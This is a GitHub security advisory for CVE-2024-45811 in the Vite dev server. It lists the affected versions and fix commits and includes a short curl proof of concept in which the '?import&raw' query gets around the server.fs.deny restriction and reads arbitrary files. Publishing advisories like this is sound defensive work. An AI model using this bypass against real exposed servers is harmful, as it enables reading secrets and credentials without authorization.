# [M] Vite's `server.fs.deny` is bypassed when using `?import&raw`

## Summary
Severity: Medium
Advisory: GHSA-9cwx-2883-4wfx
CVE: CVE-2024-45811
CWE: CWE-200, CWE-284
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2024-09-17
Source: https://github.com/advisories/GHSA-9cwx-2883-4wfx
Type: github-advisory

## Affected
- npm: `vite` — affected >=5.4.0 <5.4.6
- npm: `vite` — affected >=5.3.0 <5.3.6
- npm: `vite` — affected >=5.2.0 <5.2.14
- npm: `vite` — affected >=4.0.0 <4.5.4
- npm: `vite` — affected >=0 <3.2.11
- npm: `vite` — affected >=5.0.0 <5.1.8

## Details
### Summary
The contents of arbitrary files can be returned to the browser.

### Details
`@fs` denies access to files outside of Vite serving allow list. Adding `?import&raw` to the URL bypasses this limitation and returns the file content if it exists.

### PoC
```sh
$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev

$ echo "top secret content" > /tmp/secret.txt

# expected behaviour
$ curl "http://localhost:5173/@fs/tmp/secret.txt"

    <body>
      <h1>403 Restricted</h1>
      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.

# security bypassed
$ curl "http://localhost:5173/@fs/tmp/secret.txt?import&raw"
export default "top secret content\n"
//# sourceMappingURL=data:application/json;base64,eyJ2...
```

## References
- https://github.com/vitejs/vite/security/advisories/GHSA-9cwx-2883-4wfx
- https://nvd.nist.gov/vuln/detail/CVE-2024-45811
- https://github.com/vitejs/vite/commit/4573a6fd6f1b097fb7296a3e135e0646b996b249
- https://github.com/vitejs/vite/commit/6820bb3b9a54334f3268fc5ee1e967d2e1c0db34
- https://github.com/vitejs/vite/commit/8339d7408668686bae56eaccbfdc7b87612904bd
- https://github.com/vitejs/vite/commit/a6da45082b6e73ddfdcdcc06bb5414f976a388d6
- https://github.com/vitejs/vite/commit/b901438f99e667f76662840826eec91c8ab3b3e7
- https://github.com/vitejs/vite
